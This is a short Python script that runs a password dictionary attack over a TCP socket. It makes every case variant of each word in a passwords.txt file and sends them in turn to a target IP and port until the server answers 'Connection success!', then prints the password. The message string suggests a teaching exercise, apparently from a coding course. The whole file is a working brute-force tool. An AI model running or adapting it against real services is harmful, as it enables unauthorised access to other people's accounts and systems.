import sys
import socket
import itertools
import os


def gen_password(words):
    for word in words:
        dane = [char if char.isdigit() else (char, char.swapcase()) for char in word]
        spr = itertools.product(*dane)
        for char in spr:
            yield "".join(char)


def dictionary_attack(my_socket, buffer_size=1024):
    response = ''
    file_path = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                             "passwords.txt")
    with open(file_path, 'r') as f:
        pass_list = f.read().split()
        password_to_check = gen_password(pass_list)
        while response != 'Connection success!':
            password = next(password_to_check)
            my_socket.send(password.encode())

            response = my_socket.recv(buffer_size)
            response = response.decode()

            if response == 'Connection success!':
                print(password)
                return True
    return False


def main():
    args = sys.argv
    if len(args) != 3:
        print('You should pass 2 arguments: <IP address> <port>')
        sys.exit(1)

    ip_address = args[1]
    port = int(args[2])
    with socket.socket() as my_socket:
        address = (ip_address, port)
        my_socket.connect(address)

        if not dictionary_attack(my_socket):
            print('\nNo password found!')


if __name__ == '__main__':
    main()
